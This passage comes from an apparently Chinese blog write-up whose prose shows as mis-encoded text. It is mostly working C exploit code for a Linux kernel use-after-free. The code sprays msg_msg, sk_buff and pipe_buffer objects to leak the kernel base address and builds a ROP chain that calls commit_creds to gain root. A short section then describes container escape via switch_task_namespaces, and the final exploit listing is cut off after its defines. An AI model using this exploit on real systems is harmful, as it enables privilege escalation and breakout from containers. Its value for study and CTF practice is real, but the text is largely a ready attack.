class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_eflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2022/03/31/pwtTNfU3Xa1smzO.png" alt="image.png"></p><h2 id="å®¹å™¨é€ƒé€¸">å®¹å™¨é€ƒé€¸</h2><h3 id="Step-VI-åˆ‡æ¢è¿›ç¨‹å‘½åç©ºé—´ï¼Œå®Œæˆå®¹å™¨é€ƒé€¸"><a href="http://Step.VI">Step.VI</a> åˆ‡æ¢è¿›ç¨‹å‘½åç©ºé—´ï¼Œå®Œæˆå®¹å™¨é€ƒé€¸</h3><p>ç°åœ¨æˆ‘ä»¬å·²ç»èƒ½å¤Ÿåœ¨å†…æ ¸ç©ºé—´è¿›è¡Œ ROP äº†ï¼Œé‚£ä¹ˆå®Œæˆå®¹å™¨é€ƒé€¸å…¶å®æ˜¯é¡ºæ°´æ¨èˆŸçš„äº‹æƒ…ï¼Œå®¹å™¨å¸¸ç”¨çš„éš”ç¦»æ‰‹æ®µæ˜¯åˆ©ç”¨å‘½åç©ºé—´è¿›è¡Œéš”ç¦»ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨å†…æ ¸ä¸­å°†è¿›ç¨‹çš„å‘½åç©ºé—´åˆ‡æ¢ä¸ºåˆå§‹çš„å…¨å±€å‘½åç©ºé—´ <code>init_nsproxy</code> å³å¯å®Œæˆå®¹å™¨é€ƒé€¸ï¼Œæ‰§è¡Œ<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> å³å¯æ›¿æ¢æ‰å½“å‰è¿›ç¨‹çš„å‘½åç©ºé—´</p><h3 id="FINAL-EXPLOIT">FINAL EXPLOIT</h3><p>æ•´åˆäº†å®¹å™¨é€ƒé€¸åçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 